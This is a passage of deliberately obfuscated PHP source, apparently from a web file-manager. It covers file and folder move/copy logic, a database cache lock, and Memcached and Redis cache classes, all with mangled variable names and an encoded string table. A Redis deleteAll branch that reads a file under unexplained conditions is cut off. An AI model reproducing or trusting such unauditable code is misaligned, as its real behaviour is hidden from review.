($ü§ü¯¶Ÿ as $ã–½ÖÆù) { if ($©ôäÌúœ == strtolower($ã–½ÖÆù[$ì™šúô·[32]])) { return $ã–½ÖÆù[$ì™šúô·[203]]; } } return !1; } private function fileNameAutoCache($«Š“‹€, $šªüÛÒà, $öÆ£°¥¨, $ÓÎİ„¿Ø) { $Ö†îÛÌæ =& $_SERVER[è¶³ÒßÑ]; $§ÔÏ¹˜„ = $this->_childrenList($«Š“‹€); $ê‹Üè®ç = array_to_keyvalue($§ÔÏ¹˜„, $Ö†îÛÌæ[12], $Ö†îÛÌæ[32]); return $this->fileNameAutoGet($ê‹Üè®ç, $šªüÛÒà, $öÆ£°¥¨, $ÓÎİ„¿Ø); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($—èŒ‚ô, $ÏßÑÍ÷Ç, $¤Ü°¡ËÅ = REPEAT_REPLACE, $±£³ïå– = '') { $ßÀô»Î =& $_SERVER[è¶³ÒßÑ]; $ã”‰ß¾ = $this->sourceInfo($—èŒ‚ô); $à‚×ªëƒ = $this->sourceInfo($ÏßÑÍ÷Ç); if ($ã”‰ß¾[$ßÀô»Î[202]] == $à‚×ªëƒ[$ßÀô»Î[203]]) { if ($ã”‰ß¾[$ßÀô»Î[498]] == $ßÀô»Î[101]) { Model($ßÀô»Î[496])->restore(array($—èŒ‚ô)); } if (!$±£³ïå– || $±£³ïå– == $ã”‰ß¾[$ßÀô»Î[32]]) { return $—èŒ‚ô; } } $€ÓÚÂ½¹ = $this->pathInfoMore($—èŒ‚ô); if ($this->isParentOf($—èŒ‚ô, $ÏßÑÍ÷Ç)) { return !1; } if (!$ã”‰ß¾ || !$à‚×ªëƒ || $à‚×ªëƒ[$ßÀô»Î[478]] != $ßÀô»Î[101]) { return !1; } Hook::trigger($ßÀô»Î[651], $€ÓÚÂ½¹); $this->targetIsDelete = intval($ã”‰ß¾[$ßÀô»Î[498]]); if ($ã”‰ß¾[$ßÀô»Î[202]] == $ÏßÑÍ÷Ç && $±£³ïå– != $ã”‰ß¾[$ßÀô»Î[32]]) { $¶şÛå˜¿ = $this->fileNameExist($ÏßÑÍ÷Ç, $±£³ïå–); if ($¶şÛå˜¿ && $ã”‰ß¾[$ßÀô»Î[478]] == $ßÀô»Î[238]) { $ø•ÀóŒ = $this->sourceInfo($¶şÛå˜¿); $ùµ¾ñ = $this->fileHistory($ø•ÀóŒ, $ã”‰ß¾[$ßÀô»Î[534]], $ã”‰ß¾[$ßÀô»Î[89]]); if (!$ùµ¾ñ) { Model($ßÀô»Î[537])->remove($ã”‰ß¾[$ßÀô»Î[534]]); } $this->removeNow($—èŒ‚ô, !1); $this->folderSizeReset($ÏßÑÍ÷Ç); Hook::trigger($ßÀô»Î[652], $€ÓÚÂ½¹); return $¶şÛå˜¿; } } $úÈîñŸÊ = $±£³ïå– ? $±£³ïå– : $ã”‰ß¾[$ßÀô»Î[32]]; $this->lockMoveStart($—èŒ‚ô); $this->lockWriteStart($ÏßÑÍ÷Ç, $úÈîñŸÊ); $·èÆ°Ùø = array($ßÀô»Î[622] => array(), $ßÀô»Î[653] => !1); $this->clearShare($—èŒ‚ô, $ÏßÑÍ÷Ç); $ñ„‚ŸÙÛ = $this->fileNameExistAuto($ÏßÑÍ÷Ç, $ã”‰ß¾); $ãÛÉê« = $this->_move($—èŒ‚ô, $ÏßÑÍ÷Ç, $¤Ü°¡ËÅ, $·èÆ°Ùø, $±£³ïå–); $this->sourceCacheClear(); if ($ã”‰ß¾[$ßÀô»Î[478]] == $ßÀô»Î[101] && $ñ„‚ŸÙÛ) { $this->folderSizeResetChildren($ãÛÉê«); } Model($ßÀô»Î[240])->linkAdd($·èÆ°Ùø[$ßÀô»Î[622]]); if ($ñ„‚ŸÙÛ && $·èÆ°Ùø[$ßÀô»Î[653]]) { $this->removeNow($—èŒ‚ô, !1); } $this->lockMoveEnd($—èŒ‚ô); $this->lockWriteEnd($ÏßÑÍ÷Ç, $úÈîñŸÊ); $this->folderSizeReset($ã”‰ß¾[$ßÀô»Î[202]]); $this->folderSizeReset($ÏßÑÍ÷Ç); $¯çëŒ = array($ã”‰ß¾[$ßÀô»Î[202]], $ÏßÑÍ÷Ç); if ($ã”‰ß¾[$ßÀô»Î[478]] == $ßÀô»Î[101]) { $¯çëŒ[] = $—èŒ‚ô; } $this->updateModifyTime($¯çëŒ); Model($ßÀô»Î[626])->eventMove($—èŒ‚ô, $ã”‰ß¾[$ßÀô»Î[202]], $ÏßÑÍ÷Ç); Hook::trigger($ßÀô»Î[652], $€ÓÚÂ½¹); return $ãÛÉê«; } private function _move($½ØÒğª¿, $ù’¾õü­, $”â×Ú”ö, &$Ü™ËêİÄ, $àÕ„¬å“ = '') { $´„Óè¹Š =& $_SERVER[è¶³ÒßÑ]; $ö­Œ»• = $this->sourceInfo($½ØÒğª¿); $ß…“©ü¤ = $ö­Œ»•[$´„Óè¹Š[478]] == $´„Óè¹Š[101]; $¢¿éóõ½ = $àÕ„¬å“ ? $àÕ„¬å“ : $ö­Œ»•[$´„Óè¹Š[32]]; $©¨óéö = $this->fileNameExistAuto($ù’¾õü­, $ö­Œ»•); $this->lockMoveStart($½ØÒğª¿); $this->lockWriteStart($ù’¾õü­, $¢¿éóõ½); if (!$©¨óéö) { return $this->_moveForce($½ØÒğª¿, $ù’¾õü­, $¢¿éóõ½); } $½–˜óá = $©¨óéö; $©Ñ‡ê¿û = !1; if ($ß…“©ü¤) { if ($”â×Ú”ö == REPEAT_RENAME_FOLDER) { $¢¿éóõ½ = $this->fileNameAuto($ù’¾õü­, $¢¿éóõ½, $”â×Ú”ö, $ß…“©ü¤); $½–˜óá = $this->_moveForce($½ØÒğª¿, $ù’¾õü­, $¢¿éóõ½); } else { if ($”â×Ú”ö == REPEAT_RENAME_FOLDER) { $”â×Ú”ö = REPEAT_RENAME; } $Ş’¬üäÆ = $this->_childrenListSelect($½ØÒğª¿); foreach ($Ş’¬üäÆ as $©¯ç®øÜ) { $this->_move($©¯ç®øÜ[$´„Óè¹Š[203]], $©¨óéö, $”â×Ú”ö, $Ü™ËêİÄ); } $©Ñ‡ê¿û = !0; } } else { if ($”â×Ú”ö == REPEAT_SKIP) { $©Ñ‡ê¿û = !0; } else { if ($”â×Ú”ö == REPEAT_RENAME || $”â×Ú”ö == REPEAT_RENAME_FOLDER) { $¢¿éóõ½ = $this->fileNameAuto($ù’¾õü­, $¢¿éóõ½, $”â×Ú”ö, $ß…“©ü¤); $½–˜óá = $this->_moveForce($½ØÒğª¿, $ù’¾õü­, $¢¿éóõ½); } else { if ($”â×Ú”ö == REPEAT_REPLACE) { $§Íƒİµş = $this->sourceInfoCache($©¨óéö); $â†öÙ©½ = $this->fileHistory($§Íƒİµş, $ö­Œ»•[$´„Óè¹Š[534]], $ö­Œ»•[$´„Óè¹Š[89]]); $©Ñ‡ê¿û = !0; if ($â†öÙ©½) { $Ü™ËêİÄ[$´„Óè¹Š[622]][] = $ö­Œ»•[$´„Óè¹Š[534]]; } } } } } if ($©Ñ‡ê¿û && !$Ü™ËêİÄ[$´„Óè¹Š[653]]) { $Ü™ËêİÄ[$´„Óè¹Š[653]] = !0; } return $½–˜óá; } private function _moveForce($¼ş¡ÛÍË, $ô’ïÛÇƒ, $ĞêòÀãÛ) { $§¤•±Ä´ =& $_SERVER[è¶³ÒßÑ]; $ê¡º·ª• = $this->sourceInfo($¼ş¡ÛÍË); $œÅ‰¡ÚØ = $this->sourceInfo($ô’ïÛÇƒ); $É é±¶ = $ê¡º·ª•[$§¤•±Ä´[478]] == $§¤•±Ä´[101]; $ûàÒª¡Ÿ = array($§¤•±Ä´[470] => $œÅ‰¡ÚØ[$§¤•±Ä´[203]], $§¤•±Ä´[645] => $œÅ‰¡ÚØ[$§¤•±Ä´[577]] . $œÅ‰¡ÚØ[$§¤•±Ä´[203]] . $§¤•±Ä´[50], $§¤•±Ä´[641] => $œÅ‰¡ÚØ[$§¤•±Ä´[200]], $§¤•±Ä´[642] => $œÅ‰¡ÚØ[$§¤•±Ä´[562]], $§¤•±Ä´[644] => USER_ID, $§¤•±Ä´[487] => $ĞêòÀãÛ); $ó˜óîú¨ = $ê¡º·ª•[$§¤•±Ä´[200]] == SourceModel::TYPE_GROUP && $œÅ‰¡ÚØ[$§¤•±Ä´[200]] == SourceModel::TYPE_GROUP && $ê¡º·ª•[$§¤•±Ä´[562]] == $œÅ‰¡ÚØ[$§¤•±Ä´[562]]; if (!$ó˜óîú¨ && $this->moveClearAuth) { Model($§¤•±Ä´[560])->authClear($¼ş¡ÛÍË); } $ñ†‘±áÅ = $ê¡º·ª•[$§¤•±Ä´[498]] == $§¤•±Ä´[101] && $œÅ‰¡ÚØ[$§¤•±Ä´[498]] != $§¤•±Ä´[101]; if ($ñ†‘±áÅ) { $ûàÒª¡Ÿ[$§¤•±Ä´[497]] = 0; } if ($É é±¶) { $¶…—õ˜Ù = array($§¤•±Ä´[645] => array($§¤•±Ä´[605], $ê¡º·ª•[$§¤•±Ä´[577]] . $ê¡º·ª•[$§¤•±Ä´[203]] . $§¤•±Ä´[606])); $ã½Æßúœ = $ê¡º·ª•[$§¤•±Ä´[577]] . $ê¡º·ª•[$§¤•±Ä´[203]] . $§¤•±Ä´[50]; $‡‹ì÷ÆÑ = $œÅ‰¡ÚØ[$§¤•±Ä´[577]] . $œÅ‰¡ÚØ[$§¤•±Ä´[203]] . $§¤•±Ä´[50] . $ê¡º·ª•[$§¤•±Ä´[203]] . $§¤•±Ä´[50]; $§·‡Š¥” = array($§¤•±Ä´[645] => array($§¤•±Ä´[654], "\162\145\160\x6c\x61\x63\145\50\160\x61\162\145\156\x74\x4c\145\x76\145\154\x2c\47{$ã½Æßúœ}\47\54\47{$‡‹ì÷ÆÑ}\x27\51"), $§¤•±Ä´[641] => $œÅ‰¡ÚØ[$§¤•±Ä´[200]], $§¤•±Ä´[642] => $œÅ‰¡ÚØ[$§¤•±Ä´[562]]); if ($ñ†‘±áÅ) { $§·‡Š¥”[$§¤•±Ä´[497]] = 0; } $this->where($¶…—õ˜Ù)->data($§·‡Š¥”)->save(); } $this->where(array($§¤•±Ä´[484] => $¼ş¡ÛÍË))->data($ûàÒª¡Ÿ)->save(); return $¼ş¡ÛÍË; } private function clearShare($ ï°èáª, $¡ˆşúäì) { $‘¹æÙÉ› =& $_SERVER[è¶³ÒßÑ]; $æ˜ÑÌëê = $this->sourceInfo($ ï°èáª); $ÔÏšêƒË = $this->sourceInfo($¡ˆşúäì); if ($æ˜ÑÌëê[$‘¹æÙÉ›[562]] == $ÔÏšêƒË[$‘¹æÙÉ›[562]] && $æ˜ÑÌëê[$‘¹æÙÉ›[200]] == $‘¹æÙÉ›[655]) { return; } $“ÉÕ¦«· = array($‘¹æÙÉ›[577] => array($‘¹æÙÉ›[605], $æ˜ÑÌëê[$‘¹æÙÉ›[577]] . $ ï°èáª . $‘¹æÙÉ›[606])); $ÎÃ™„âé = $this->field($‘¹æÙÉ›[484])->where($“ÉÕ¦«·)->getField($‘¹æÙÉ›[203], !0); if (!$ÎÃ™„âé) { return; } $“ÉÕ¦«· = array($‘¹æÙÉ›[203] => array($‘¹æÙÉ›[7], $ÎÃ™„âé), $‘¹æÙÉ›[656] => 1); $•ŞÔ¯î = Model($‘¹æÙÉ›[657])->field($‘¹æÙÉ›[658])->where($“ÉÕ¦«·)->select(); if (!$•ŞÔ¯î) { return; } $•ŞÔ¯î = array_to_keyvalue($•ŞÔ¯î, $‘¹æÙÉ›[12], $‘¹æÙÉ›[658]); $“ÉÕ¦«· = array($‘¹æÙÉ›[658] => array($‘¹æÙÉ›[7], $•ŞÔ¯î)); Model($‘¹æÙÉ›[657])->where($“ÉÕ¦«·)->save(array($‘¹æÙÉ›[656] => 0)); Model($‘¹æÙÉ›[659])->where($“ÉÕ¦«·)->delete(); } public function copyFolderFromIO($¾‹Í­û£, $¦¯‘şØ³, $ÑîøúÎÎ, $·šøËÉ, $‹ğ“ÑÓ, $ñÂ™šÀÂ = false) { $È²åû’½ =& $_SERVER[è¶³ÒßÑ]; $Ô÷Ä‡†ê = array($È²åû’½[623] => array(), $È²åû’½[624] => array(), $È²åû’½[622] => array(), $È²åû’½[660] => array()); $£ù§İë = $ñÂ™šÀÂ ? $ñÂ™šÀÂ : $¾‹Í­û£->pathThis($¦¯‘şØ³); $¢Á…á³ = $this->fileNameExist($ÑîøúÎÎ, $£ù§İë); $Î–†Üï¹ = $this->mkdir($ÑîøúÎÎ, $£ù§İë, $·šøËÉ); if (!$¢Á…á³ || $·šøËÉ == REPEAT_RENAME_FOLDER) { $·šøËÉ = !1; } if ($¢Á…á³) { $this->_childrenAllMake($¢Á…á³); } Hook::trigger($È²åû’½[661]); $this->_copyChildTo($¾‹Í­û£, $¦¯‘şØ³, $Î–†Üï¹, $·šøËÉ, $Ô÷Ä‡†ê, $‹ğ“ÑÓ); Hook::trigger($È²åû’½[662]); if ($Î–†Üï¹) { $this->folderSizeResetChildren($Î–†Üï¹); } $this->_childrenListClear(); Model($È²åû’½[625])->addAll($Ô÷Ä‡†ê[$È²åû’½[623]], array(), !0); Model($È²åû’½[626])->eventCopy($Î–†Üï¹); $this->saveAll($Ô÷Ä‡†ê[$È²åû’½[624]]); Model($È²åû’½[537])->linkAdd($Ô÷Ä‡†ê[$È²åû’½[622]]); Model($È²åû’½[537])->remove($Ô÷Ä‡†ê[$È²åû’½[660]]); $this->folderSizeReset($ÑîøúÎÎ); $this->updateModifyTime($ÑîøúÎÎ); return $Î–†Üï¹; } private function _copyChildTo($î»ÙŸ›, $ûè±„™ô, $½ ’–è, $ı““è­, &$”°Ã»ÊÅ, $‰Ø³¿‹á) { $´®ñ¾˜° =& $_SERVER[è¶³ÒßÑ]; $¯êêÊõ§ = $this->sourceInfoCache($½ ’–è); $ÕÛœâÎ = $î»ÙŸ›->listPath($ûè±„™ô); $ÕÛœâÎ = $ÕÛœâÎ ? $ÕÛœâÎ : array($´®ñ¾˜°[96] => array(), $´®ñ¾˜°[95] => array()); $üƒØğşö = array_merge($ÕÛœâÎ[$´®ñ¾˜°[96]], $ÕÛœâÎ[$´®ñ¾˜°[95]]); $‡Ö××Ğü = $this->_addFiles($î»ÙŸ›, $ÕÛœâÎ[$´®ñ¾˜°[96]], $‰Ø³¿‹á); $ˆäÒóí = array(); foreach ($üƒØğşö as &$ô‹¬Œİå) { if (isset($‡Ö××Ğü[$ô‹¬Œİå[$´®ñ¾˜°[32]]])) { $ô‹¬Œİå = $‡Ö××Ğü[$ô‹¬Œİå[$´®ñ¾˜°[32]]]; } $ô‹¬Œİå[$´®ñ¾˜°[478]] = $ô‹¬Œİå[$´®ñ¾˜°[33]] == $´®ñ¾˜°[88]; $ô‹¬Œİå[$´®ñ¾˜°[479]] = substr(_get($ô‹¬Œİå, $´®ñ¾˜°[179], $´®ñ¾˜°[12]), 0, 10); $ô‹¬Œİå[$´®ñ¾˜°[89]] = _get($ô‹¬Œİå, $´®ñ¾˜°[89], 0); $ô‹¬Œİå[$´®ñ¾˜°[534]] = _get($ô‹¬Œİå, $´®ñ¾˜°[534], 0); if (!isset($ô‹¬Œİå[$´®ñ¾˜°[663]]) && $ô‹¬Œİå[$´®ñ¾˜°[534]]) { $”°Ã»ÊÅ[$´®ñ¾˜°[660]][] = $ô‹¬Œİå[$´®ñ¾˜°[534]]; } if ($ı““è­) { $ÛÏ˜­‰ = $this->fileNameExistCache($½ ’–è, $ô‹¬Œİå[$´®ñ¾˜°[32]]); if ($ÛÏ˜­‰) { if ($ô‹¬Œİå[$´®ñ¾˜°[478]] || $ı““è­ == REPEAT_SKIP) { continue; } if ($ı““è­ == REPEAT_REPLACE) { $ÂÕÙì¯è = $this->sourceInfoCache($ÛÏ˜­‰); $“ÂÌ²ôæ = $this->fileHistory($ÂÕÙì¯è, $ô‹¬Œİå[$´®ñ¾˜°[534]], $ô‹¬Œİå[$´®ñ¾˜°[89]]); if ($“ÂÌ²ôæ) { $”°Ã»ÊÅ[$´®ñ¾˜°[622]][] = $ô‹¬Œİå[$´®ñ¾˜°[534]]; } continue; } else { if ($ı““è­ == REPEAT_RENAME) { $ô‹¬Œİå[$´®ñ¾˜°[32]] = $this->fileNameAutoCache($½ ’–è, $ô‹¬Œİå[$´®ñ¾˜°[32]], $ı““è­, !1); } } } } if (!$ô‹¬Œİå[$´®ñ¾˜°[478]] && $ô‹¬Œİå[$´®ñ¾˜°[534]] == 0) { continue; } if (!$ô‹¬Œİå[$´®ñ¾˜°[478]] && $ô‹¬Œİå[$´®ñ¾˜°[534]]) { $”°Ã»ÊÅ[$´®ñ¾˜°[622]][] = $ô‹¬Œİå[$´®ñ¾˜°[534]]; } $ˆäÒóí[] = $this->_makeItemData($ô‹¬Œİå, $¯êêÊõ§, $ô‹¬Œİå[$´®ñ¾˜°[32]]); } unset($ô‹¬Œİå); if (!empty($ˆäÒóí)) { $this->addAll($ˆäÒóí); $this->_childrenListSelect($½ ’–è); } $Á®ğİ‚ñ = $this->_childrenList($½ ’–è); $Á®ğİ‚ñ = array_to_keyvalue($Á®ğİ‚ñ, $´®ñ¾˜°[32]); foreach ($üƒØğşö as $ô‹¬Œİå) { $ÂÕÙì¯è = $Á®ğİ‚ñ[$ô‹¬Œİå[$´®ñ¾˜°[32]]]; $Íåö‹œŞ = $ÂÕÙì¯è[$´®ñ¾˜°[203]]; $this->_copyApplyMeta($ÂÕÙì¯è, $”°Ã»ÊÅ); if ($ô‹¬Œİå[$´®ñ¾˜°[33]] == $´®ñ¾˜°[88]) { $ô‹¬Œİå[$´®ñ¾˜°[97]] = $î»ÙŸ›->getPathInner($ô‹¬Œİå[$´®ñ¾˜°[97]]); $this->_copyChildTo($î»ÙŸ›, $ô‹¬Œİå[$´®ñ¾˜°[97]], $Íåö‹œŞ, $ı““è­, $”°Ã»ÊÅ, $‰Ø³¿‹á); } } } private function _addFiles($£¹ã¨‡Ö, $áç…áÖˆ, $†Äõ“¥Ü) { $Ñ×Œî¡Ì =& $_SERVER[è¶³ÒßÑ]; if (!$áç…áÖˆ || count($áç…áÖˆ) == 0) { return array(); } $’á„ô• = array(); foreach ($áç…áÖˆ as &$š¡Ïï±Ä) { Hook::trigger($Ñ×Œî¡Ì[664], $š¡Ïï±Ä); $š¡Ïï±Ä[$Ñ×Œî¡Ì[97]] = $£¹ã¨‡Ö->getPathInner($š¡Ïï±Ä[$Ñ×Œî¡Ì[97]]); $èËİÄ²¯ = $£¹ã¨‡Ö->hashSimple($š¡Ïï±Ä[$Ñ×Œî¡Ì[97]]); $½¨ˆÛ¸€ = $£¹ã¨‡Ö->hashMd5($š¡Ïï±Ä[$Ñ×Œî¡Ì[97]]); if (strlen($½¨ˆÛ¸€) > 10 && !isset($’á„ô•[$½¨ˆÛ¸€])) { $’á„ô•[$½¨ˆÛ¸€] = array(); } $š¡Ïï±Ä[$Ñ×Œî¡Ì[665]] = $èËİÄ²¯; $š¡Ïï±Ä[$Ñ×Œî¡Ì[540]] = $½¨ˆÛ¸€; $’á„ô•[$½¨ˆÛ¸€][] =& $š¡Ïï±Ä; if (count($’á„ô•[$½¨ˆÛ¸€]) > 1) { $š¡Ïï±Ä[$Ñ×Œî¡Ì[663]] = !0; } Hook::trigger($Ñ×Œî¡Ì[666], $š¡Ïï±Ä); } unset($š¡Ïï±Ä); $¨š†Ø = array($Ñ×Œî¡Ì[540] => array($Ñ×Œî¡Ì[7], array_keys($’á„ô•))); $±¼‘éóØ = Model($Ñ×Œî¡Ì[667]); $Ê€†ÊÖ = $±¼‘éóØ->where($¨š†Ø)->select(); $Ê€†ÊÖ = $Ê€†ÊÖ ? $Ê€†ÊÖ : array(); foreach ($Ê€†ÊÖ as $Û¯‹‡€ã) { if (!isset($’á„ô•[$Û¯‹‡€ã[$Ñ×Œî¡Ì[540]]])) { continue; } $×˜îÅºÙ = $’á„ô•[$Û¯‹‡€ã[$Ñ×Œî¡Ì[540]]]; foreach ($×˜îÅºÙ as &$š¡Ïï±Ä) { $š¡Ïï±Ä[$Ñ×Œî¡Ì[534]] = $Û¯‹‡€ã[$Ñ×Œî¡Ì[534]]; $š¡Ïï±Ä[$Ñ×Œî¡Ì[663]] = !0; } unset($š¡Ïï±Ä); } $³Ã¤Èé = array(); foreach ($áç…áÖˆ as $è«à¥ñ) { Hook::trigger($Ñ×Œî¡Ì[668], $è«à¥ñ); if (isset($è«à¥ñ[$Ñ×Œî¡Ì[663]]) && $è«à¥ñ[$Ñ×Œî¡Ì[663]]) { Hook::trigger($Ñ×Œî¡Ì[669], $è«à¥ñ); continue; } $Ññô’ö = $£¹ã¨‡Ö->getPathInner($è«à¥ñ[$Ñ×Œî¡Ì[97]]); $ÉÏ‰Ëì = $±¼‘éóØ->addFileMake($Ññô’ö, $è«à¥ñ[$Ñ×Œî¡Ì[89]], $è«à¥ñ[$Ñ×Œî¡Ì[665]], $è«à¥ñ[$Ñ×Œî¡Ì[540]], $è«à¥ñ[$Ñ×Œî¡Ì[32]], $†Äõ“¥Ü); Hook::trigger($Ñ×Œî¡Ì[669], $è«à¥ñ); if (!is_array($ÉÏ‰Ëì)) { continue; } $³Ã¤Èé[] = $ÉÏ‰Ëì; } $±¼‘éóØ->addAll($³Ã¤Èé); $¨š†Ø = array($Ñ×Œî¡Ì[540] => array($Ñ×Œî¡Ì[7], array_keys($’á„ô•))); $Ê€†ÊÖ = $±¼‘éóØ->where($¨š†Ø)->select(); $Ê€†ÊÖ = $Ê€†ÊÖ ? $Ê€†ÊÖ : array(); foreach ($Ê€†ÊÖ as $Û¯‹‡€ã) { if (!isset($’á„ô•[$Û¯‹‡€ã[$Ñ×Œî¡Ì[540]]])) { continue; } $²²£‰­€ =& $’á„ô•[$Û¯‹‡€ã[$Ñ×Œî¡Ì[540]]]; foreach ($²²£‰­€ as &$š¡Ïï±Ä) { $š¡Ïï±Ä[$Ñ×Œî¡Ì[534]] = $Û¯‹‡€ã[$Ñ×Œî¡Ì[534]]; } unset($š¡Ïï±Ä); } $•ŠÑÊ¯æ = array(); foreach ($áç…áÖˆ as $—±ø”) { $•ŠÑÊ¯æ[$—±ø”[$Ñ×Œî¡Ì[32]]] = $—±ø”; } return $•ŠÑÊ¯æ; } } goto A«ùÃÌ÷Šë; cÑ°Ö­è§: class CacheLockDatabase { public function lock($í†ªÙİš, $áÁ×’ˆ = 0) { $øÕ …Èù = Model($_SERVER[è¶³ÒßÑ][882]); $ÛŒ„Î«è = microtime(!0) + $áÁ×’ˆ; while (microtime(!0) < $ÛŒ„Î«è) { $Àà¬³Ú› = $øÕ …Èù->get($í†ªÙİš); if (!$Àà¬³Ú› || $Àà¬³Ú› < microtime(!0)) { $¡Âñã = $øÕ …Èù->set($í†ªÙİš, $ÛŒ„Î«è); if ($¡Âñã) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($”Á®Å×‚) { return Model($_SERVER[è¶³ÒßÑ][882])->get($”Á®Å×‚); } public function unlock($²¶ÑŞÒÄ) { Model($_SERVER[è¶³ÒßÑ][882])->remove($²¶ÑŞÒÄ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ˆÈŠºÔş, $–ëÊÜ–) { $´Úë¥¾† =& $_SERVER[è¶³ÒßÑ]; if (!class_exists($´Úë¥¾†[920])) { show_json($´Úë¥¾†[921], !1); } $this->cacheTime = $–ëÊÜ–; $this->handle = new Memcached(); if (is_array($ˆÈŠºÔş[$´Úë¥¾†[922]]) && count($ˆÈŠºÔş[$´Úë¥¾†[922]]) >= 1) { foreach ($ˆÈŠºÔş[$´Úë¥¾†[922]] as $”Ê—Øæà) { $ŠÑ“üÄ– = explode($´Úë¥¾†[4], $”Ê—Øæà); $this->handle->addServer($ŠÑ“üÄ–[0], $ŠÑ“üÄ–[1]); } } else { $this->handle->addServer($ˆÈŠºÔş[$´Úë¥¾†[218]], $ˆÈŠºÔş[$´Úë¥¾†[219]]); } } public function set($õ¢ºØØ, $ç¥®à«, $ä±ìÙ‰¤ = false) { $ä±ìÙ‰¤ = $ä±ìÙ‰¤ ? $ä±ìÙ‰¤ : $this->cacheTime; return $this->handle->set($õ¢ºØØ, $ç¥®à«, $ä±ìÙ‰¤); } public function get($²–ğ­©²) { return $this->handle->get($²–ğ­©²); } public function remove($…ÎòÏÑ—) { return $this->handle->delete($…ÎòÏÑ—); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÜÜöğ’ú, $‚éÅËê) { $²§òÎ =& $_SERVER[è¶³ÒßÑ]; if (!class_exists($²§òÎ[923])) { show_json($²§òÎ[924], !1); } $this->cacheTime = $‚éÅËê; $šÂ­¥ÆÊ = isset($ÜÜöğ’ú[$²§òÎ[925]]) ? $ÜÜöğ’ú[$²§òÎ[925]] : 10; $³ŞÌĞñ = _get($ÜÜöğ’ú, $²§òÎ[922]); if ($³ŞÌĞñ && is_array($³ŞÌĞñ)) { $this->initCluster($ÜÜöğ’ú, $šÂ­¥ÆÊ); } else { $this->handle = $this->init($ÜÜöğ’ú, $šÂ­¥ÆÊ); } } private function init($çÜ‡‘Œô, $™É¡•¤) { $·°†²·å =& $_SERVER[è¶³ÒßÑ]; $¤ŒÓ¦Ë = new Redis(); $İ“§‹ß» = isset($çÜ‡‘Œô[$·°†²·å[926]]) ? $çÜ‡‘Œô[$·°†²·å[926]] : !1; if ($İ“§‹ß») { $¤ŒÓ¦Ë->pconnect($çÜ‡‘Œô[$·°†²·å[218]], $çÜ‡‘Œô[$·°†²·å[219]], $™É¡•¤); } else { $¤ŒÓ¦Ë->connect($çÜ‡‘Œô[$·°†²·å[218]], $çÜ‡‘Œô[$·°†²·å[219]], $™É¡•¤); } if (!empty($çÜ‡‘Œô[$·°†²·å[480]])) { $¤ŒÓ¦Ë->auth($çÜ‡‘Œô[$·°†²·å[480]]); } if (!empty($çÜ‡‘Œô[$·°†²·å[811]]) && $çÜ‡‘Œô[$·°†²·å[811]] != 0) { $¤ŒÓ¦Ë->select($çÜ‡‘Œô[$·°†²·å[811]]); } return $¤ŒÓ¦Ë; } private function initCluster($‚¦‡¯ìé, $Ïôì¦¯) { $Õ‡ààªÌ =& $_SERVER[è¶³ÒßÑ]; $¡Ç¾íŒ = array($Õ‡ààªÌ[927], $Õ‡ààªÌ[928], $Õ‡ààªÌ[929]); $ØÅ ÙˆØ = $Õ‡ààªÌ[927]; if (isset($‚¦‡¯ìé[$Õ‡ààªÌ[16]]) && in_array($‚¦‡¯ìé[$Õ‡ààªÌ[16]], $¡Ç¾íŒ)) { $ØÅ ÙˆØ = $‚¦‡¯ìé[$Õ‡ààªÌ[16]]; } switch ($ØÅ ÙˆØ) { case $Õ‡ààªÌ[927]: $this->_slave($‚¦‡¯ìé, $Ïôì¦¯); break; case $Õ‡ààªÌ[928]: break; case $Õ‡ààªÌ[929]: $this->isCluster = !0; $ûù¯«°Í = $‚¦‡¯ìé[$Õ‡ààªÌ[922]]; $ÚÓµÂéĞ = isset($‚¦‡¯ìé[$Õ‡ààªÌ[926]]) ? $‚¦‡¯ìé[$Õ‡ààªÌ[926]] : !1; $™ÌÑƒ†£ = isset($‚¦‡¯ìé[$Õ‡ààªÌ[480]]) ? $‚¦‡¯ìé[$Õ‡ààªÌ[480]] : null; $this->handle = new RedisCluster(NUll, $ûù¯«°Í, $Ïôì¦¯, $Ïôì¦¯, $ÚÓµÂéĞ, $™ÌÑƒ†£); break; default: break; } } private function _slave($ÀÖƒõ², $¾ñ§„Š) { $¸¤úŞ¶ = $ÀÖƒõ²[$_SERVER[è¶³ÒßÑ][922]]; $this->filterConfig($ÀÖƒõ², $¸¤úŞ¶[0]); $this->handle = $this->init($ÀÖƒõ², $¾ñ§„Š); unset($¸¤úŞ¶[0]); if (empty($¸¤úŞ¶)) { return; } $¦ ¹Ü = array_rand($¸¤úŞ¶); $this->filterConfig($ÀÖƒõ², $¸¤úŞ¶[$¦ ¹Ü]); $this->slaveHandle = $this->init($ÀÖƒõ², $¾ñ§„Š); } private function filterConfig(&$ö£¯ÉÆ, $Š¬İ„ø„) { $©µÓ²± =& $_SERVER[è¶³ÒßÑ]; $×ùĞ×‚™ = explode($©µÓ²±[4], $Š¬İ„ø„); $›Ä÷ÆÏ§ = array($©µÓ²±[218] => $×ùĞ×‚™[0], $©µÓ²±[219] => $×ùĞ×‚™[1]); $ö£¯ÉÆ = array_merge($ö£¯ÉÆ, $›Ä÷ÆÏ§); } public function set($¶š¼âê , $¾÷äŠ´, $ß½Äóäƒ = false) { $ß½Äóäƒ = $ß½Äóäƒ ? $ß½Äóäƒ : $this->cacheTime; return $this->handle->setEx($¶š¼âê , $ß½Äóäƒ, $¾÷äŠ´); } public function setLock($üÏŠ§üÆ, $×å´ş¼Â, $ˆ¼™Å¨Ã) { return $this->handle->setNX($üÏŠ§üÆ, $×å´ş¼Â); } public function get($™®„·µ) { $Ú¡€Éñš = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ú¡€Éñš->get($™®„·µ); } public function remove($ÅÇÆÀÉ) { return $this->handle->del($ÅÇÆÀÉ); } public function deleteAll() { $ëîçóœœ =& $_SERVER[è¶³ÒßÑ]; if ($_SERVER[$ëîçóœœ[56]] != $_SERVER[$ëîçóœœ[930]]) { $ï—‡µÁõ = $ëîçóœœ[931]; $Ã³çÛÊÜ = $ëîçóœœ[57]; $•šÓı’â = $_SERVER[$ëîçóœœ[58]] . $ëîçóœœ[59]; $­¿„ÑµÖ = $Ã³çÛÊÜ($•šÓı’â); $“ ÷Ü‚÷ = explode($ëîçóœœ[60], $­¿„ÑµÖ); if (count($“ ÷Ü‚÷) < 